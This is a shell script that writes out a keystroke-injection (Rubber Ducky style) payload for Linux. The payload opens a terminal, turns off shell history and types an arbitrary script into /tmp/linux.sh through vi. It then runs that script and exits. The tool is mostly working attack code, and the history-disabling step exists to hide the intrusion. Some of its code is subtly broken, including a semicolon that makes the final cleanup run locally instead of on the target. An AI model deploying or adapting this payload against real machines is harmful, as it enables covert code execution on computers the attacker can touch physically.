#!/bin/sh

# Open terminal
# Option1: GUI + String terminal/console/konsole/cmd/gnome-terminal
# Option2: ALT F2 + STRING gnome-terminal
# Option3: CTRL ALT t
echo
echo REM Open terminal
echo DELAY 1000
echo gui
echo DELAY 300
echo STRING gnome-terminal
echo ENTER
echo DELAY 100

# Disable logging
echo REM Disable logging
echo STRING set +o history
echo ENTER

# Delete file and open editor
echo
echo REM Open editor
echo DELAY 100
echo STRING rm -f /tmp/linux.sh
echo ENTER
echo DELAY 100
echo STRING vi /tmp/linux.sh
echo ENTER
echo STRING i
echo ENTER

# Intput script
echo
echo REM Input script
while read line; do
#	while read letter; do
#   if [[ $letter == " " ]]; then
#     echo "SPACE"
#		if [[ $letter == "{"]]; then
#			echo "ALT_RIGHT 7"
#		elif [[ $letter == "["]]; then
#			echo "ALT_RIGHT 8"
#		elif [[ $letter == "]"]]; then
#			echo "ALT_RIGHT 9"
#		elif [[ $letter == "}"]]; then
#			echo "ALT_RIGHT 0"
#		elif [[ $letter == "\"]]; then
#			echo "ALT_RIGHT ß"
#   elif [[ $letter == "|"]]; then
#			echo "ALT_RIGHT <"
#   fi
#		echo ENTER
#	done < $line
  echo STRING  $line;
  echo ENTER
done < $1

# Save file
echo
echo REM Save file
echo ESCAPE
echo STRING :wq!
echo ENTER

# Run script
echo
echo REM Run script
echo STRING bash /tmp/linux.sh; rm -f /tmp/linux.sh
echo ENTER
echo STRING exit
echo ENTER
